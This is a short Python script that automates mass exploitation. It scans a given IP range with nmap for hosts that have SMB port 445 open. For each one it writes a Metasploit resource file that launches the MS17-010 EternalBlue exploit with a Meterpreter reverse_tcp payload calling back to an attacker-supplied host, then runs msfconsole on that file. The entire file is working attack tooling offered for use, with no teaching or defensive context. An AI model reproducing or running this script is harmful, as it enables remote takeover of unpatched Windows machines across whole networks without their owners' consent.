import nmap
import optparse
from IPy import IP
import os
def find_target(host):
	target_list=[]
	for target in IP(str(host))[1:]:
		target=str(target)
		scanner=nmap.PortScanner()
		rst=scanner.scan(target,'445')
		if rst['nmap']['scanstats']['uphosts'] == '0':
			print 'Host not up:'+target
			continue
		state=rst['scan'][target]['tcp'][445]['state']
		if state =='open':
			target_list.append(target)
			print str(target)+' with 445 port open, there may be a vulnerability in ms17_010'
		else:
			print str(target)+' 445 port not open!'
	return target_list


def create_file(configfile,target,lhost):
	configfile.write('use exploit/windows/smb/ms17_010_eternalblue\n')
	configfile.write('set rhost '+target+'\n')
	configfile.write('set payload windows/x64/meterpreter/reverse_tcp\n')
	lport=4444+int(target.split('.')[-1])
	configfile.write('set lport '+str(lport)+'\n')
	configfile.write('set lhost '+str(lhost)+'\n')
	configfile.write('exploit -j -z\n')
	print "Your shell will created at "+ str(lhost) + ":"+str(lport)


def main():
	parser = optparse.OptionParser('%prog -H <target> -L <lhost>')
	parser.add_option('-H',dest='host',type='string')
	parser.add_option('-L',dest='lhost',type='string')
	(options,args) = parser.parse_args()
	host=options.host
	lhost=options.lhost
	if host == None:
		parser.print_help()
		exit(0)
	target_list=find_target(host)
	for target in target_list:
		configfile = open('meta.rc','a')
		create_file(configfile,target,lhost)
		configfile.close()
	command='msfconsole -r meta.rc'
	os.system(command)
if __name__ == '__main__':
	main()